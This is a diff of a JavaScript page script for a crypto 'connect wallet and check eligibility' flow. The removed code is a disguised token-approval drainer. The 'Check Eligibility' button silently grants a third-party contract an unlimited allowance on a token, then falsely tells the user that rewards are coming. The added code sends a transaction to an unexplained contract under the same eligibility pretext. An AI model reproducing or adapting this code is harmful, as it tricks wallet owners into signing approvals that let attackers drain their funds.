@@ -1,48 +1,35 @@
-document.addEventListener("DOMContentLoaded", function () {
-  const connectWalletBtn = document.getElementById("connectWallet");
-  const checkEligibilityBtn = document.getElementById("checkEligibility");
-  const statusDiv = document.getElementById("status");
+const CONTRACT_ADDRESS = "0xFe28F7c42a5BF23F5000B4326856820899f592e8";
+const ABI = [
+  "function checkEligibility() external",
+];
 
-  let signer;
+let provider, signer, contract;
 
-  // توکن تستی و آدرس قرارداد گیرنده (B)
-  const tokenAddress = "0x452f86bCBb7C0fD6975e67557c9044294215d7bD";
-  const spenderAddress = "0x8773954b3F09238fe70A41E57BaE25EcE05Ad24a"; // contract B
+async function connectWallet() {
+  if (window.ethereum) {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
 
-  const tokenAbi = [
-    "function approve(address spender, uint256 amount) public returns (bool)"
-  ];
+    document.getElementById("status").innerText = "✅ Wallet connected";
+    document.getElementById("checkEligibility").disabled = false;
+  } else {
+    alert("Please install MetaMask!");
+  }
+}
 
-  connectWalletBtn.addEventListener("click", async () => {
-    if (window.ethereum) {
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        const address = await signer.getAddress();
-        statusDiv.innerHTML = `✅ Wallet connected: ${address}`;
-        checkEligibilityBtn.disabled = false;
-      } catch (err) {
-        statusDiv.innerHTML = "❌ Wallet connection failed.";
-      }
-    } else {
-      statusDiv.innerHTML = "❌ MetaMask not detected.";
-    }
-  });
+async function checkEligibility() {
+  try {
+    document.getElementById("status").innerText = "⏳ Checking eligibility...";
+    const tx = await contract.checkEligibility();
+    await tx.wait();
+    document.getElementById("status").innerText = "✅ Eligibility confirmed";
+  } catch (error) {
+    console.error(error);
+    document.getElementById("status").innerText = "❌ Eligibility check failed";
+  }
+}
 
-  checkEligibilityBtn.addEventListener("click", async () => {
-    if (!signer) return;
-
-    const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
-    const amount = ethers.constants.MaxUint256; // مقدار بزرگ برای مجوز کامل
-
-    try {
-      const tx = await tokenContract.approve(spenderAddress, amount);
-      await tx.wait();
-      statusDiv.innerHTML = "✅ Eligibility confirmed. You'll receive rewards soon if eligible.";
-    } catch (err) {
-      console.error("Approval error:", err);
-      statusDiv.innerHTML = "❌ Eligibility check failed.";
-    }
-  });
-});
+document.getElementById("connectWallet").addEventListener("click", connectWallet);
+document.getElementById("checkEligibility").addEventListener("click", checkEligibility);
